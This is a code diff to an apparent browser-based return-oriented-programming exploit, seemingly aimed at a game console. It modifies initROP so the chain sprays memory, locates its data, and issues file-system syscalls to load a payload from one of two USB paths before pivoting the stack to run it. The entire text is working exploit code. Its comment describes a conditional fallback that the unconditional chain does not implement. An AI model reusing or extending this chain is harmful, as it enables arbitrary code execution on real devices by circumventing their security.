@@ -28,29 +28,43 @@ function initROP(init)
 		search_base_off=0*mbytes;
 		total_loops++;
 		
-		xtra_data=start_x.convert()+usb_sp.convert()
-		+index_key.convert(true)
-		+unescape("\uFD7E");
-		while(xtra_data_addr===0)
+		// build xtra_data with two USB paths: usb_sp0 then usb_sp1
+		xtra_data = start_x.convert()
+			+ usb_sp0.convert()
+			+ usb_sp1.convert()
+			+ index_key.convert(true)
+			+ unescape("\uFD7E");
+
+		while (xtra_data_addr === 0)
 		{
-			if(search_max_threshold<search_size){load_check();return;}
-			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
-			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);
-			search_max_threshold-=search_size;
+			if (search_max_threshold < search_size) { load_check(); return; }
+			xtra_data = xtra_data.replaceAt(0, hexh2bin(0x7EFD));
+			xtra_data_addr = findJsVariableOffset("xtra_data", xtra_data, search_base, search_size);
+			search_max_threshold -= search_size;
 		}
-		
-		
-		usb_fp_addr=xtra_data_addr+start_x.convertedSize()-0x4;
-		index_key_addr=usb_fp_addr+usb_sp.convertedSize();
+
+		// calculate addresses (note: -0x4 used in original to align pointer usage)
+		var usb_sp0_addr = xtra_data_addr + start_x.convertedSize() - 0x4;
+		var usb_sp1_addr = usb_sp0_addr + usb_sp0.convertedSize();
+		var usb_fp_addr  = usb_sp0_addr; // legacy name kept for compatibility (first attempt)
+		index_key_addr   = usb_sp1_addr + usb_sp1.convertedSize();
 		//############################ Building stack frame ###############################################################
-		stack_frame=stack_frame_hookup()
-		+store_word(0x8a000004,sp_exit)
-		+store_word(0x8a000014,gadget_mod8_addr)
-		+syscall(sc_fs_open,usb_fp_addr,fs_flag_readonly,0x8e000000,0,0,0,0,0)
-		+syscall_r3r5_p2p(sc_fs_read,0x8e000000,0x8a000000,0x110000,0x8e000008,0,0,0,0,0,0)
-		+syscall_r3_p2p(sc_fs_close,0x8e000000,0,0,0,0,0,0,0,0,0)
-		+stack_frame_swap(0x8a000000)
-		+stack_frame_exit();
+		stack_frame = stack_frame_hookup()
+			+ store_word(0x8a000004, sp_exit)
+			+ store_word(0x8a000014, gadget_mod8_addr)
+
+			// --- Try USB000 first (usb_sp0_addr) ---
+			+ syscall(sc_fs_open, usb_sp0_addr, fs_flag_readonly, 0x8e000000, 0,0,0,0,0)
+			+ syscall_r3r5_p2p(sc_fs_read, 0x8e000000, 0x8a000000, 0x110000, 0x8e000008, 0,0,0,0,0,0)
+			+ syscall_r3_p2p(sc_fs_close, 0x8e000000, 0,0,0,0,0,0,0,0,0)
+
+			// --- If USB000 not present, try USB001 (usb_sp1_addr) ---
+			+ syscall(sc_fs_open, usb_sp1_addr, fs_flag_readonly, 0x8e000000, 0,0,0,0,0)
+			+ syscall_r3r5_p2p(sc_fs_read, 0x8e000000, 0x8a000000, 0x110000, 0x8e000008, 0,0,0,0,0,0)
+			+ syscall_r3_p2p(sc_fs_close, 0x8e000000, 0,0,0,0,0,0,0,0,0)
+
+			+ stack_frame_swap(0x8a000000)
+			+ stack_frame_exit();
 		//############################ End stack frame ###############################################################		
 		while(stack_frame_addr===0)
 		{
